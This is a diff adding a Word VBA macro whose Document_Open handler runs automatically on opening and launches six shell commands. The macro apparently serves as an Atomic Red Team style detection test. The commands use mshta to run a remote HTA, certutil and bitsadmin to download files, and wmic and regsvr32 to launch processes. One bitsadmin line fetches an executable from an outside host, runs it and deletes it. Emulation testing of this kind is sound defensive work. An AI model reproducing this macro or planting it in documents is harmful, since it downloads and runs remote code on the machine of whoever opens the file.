@@ -1,0 +1,32 @@
+Sub Document_Open()
+  test1
+  test2
+  test3
+  test4
+  test5
+  test6
+End Sub
+
+Function test1()
+Call Shell("mshta.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta")
+End Function
+
+Function test2()
+Call Shell("certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt")
+End Function
+
+Function test3()
+Call Shell("wmic process call create notepad.exe")
+End Function
+
+Function test4()
+Call Shell("wmic.exe process call create 'regsvr32.exe -s C:/Users/Public/mids.pds'")
+End Function
+
+Function test5()
+Call Shell("bitsadmin /transfer 70d1 http://vibing.catjamfest.com:8080/b %APPDATA%\70d1.exe&%APPDATA%\70d1.exe&del %APPDATA%\70d1.exe")
+End Function
+
+Function test6()
+Call Shell("bitsadmin.exe /transfer /Download /priority Foreground url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin1_flag.ps1")
+End Function
